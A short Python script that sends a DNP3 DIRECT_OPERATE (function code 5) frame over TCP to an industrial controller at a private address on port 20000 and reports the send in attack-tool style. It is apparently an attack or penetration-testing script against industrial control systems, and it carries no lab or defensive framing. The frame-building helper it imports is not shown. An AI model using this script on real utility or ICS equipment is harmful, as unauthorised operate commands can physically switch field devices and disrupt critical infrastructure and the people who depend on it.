import socket
from dnp3_frame import build_dnp3_frame

TARGET_IP, TARGET_PORT = "10.0.30.10", 20000

payload = build_dnp3_frame(function_code=5, dest=1, src=1024)  # DIRECT_OPERATE

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2.0)
s.connect((TARGET_IP, TARGET_PORT))
s.sendall(payload)
s.close()
print(f"[+] Sent DNP3 fc=5 frame ({len(payload)} bytes) to {TARGET_IP}:{TARGET_PORT}")
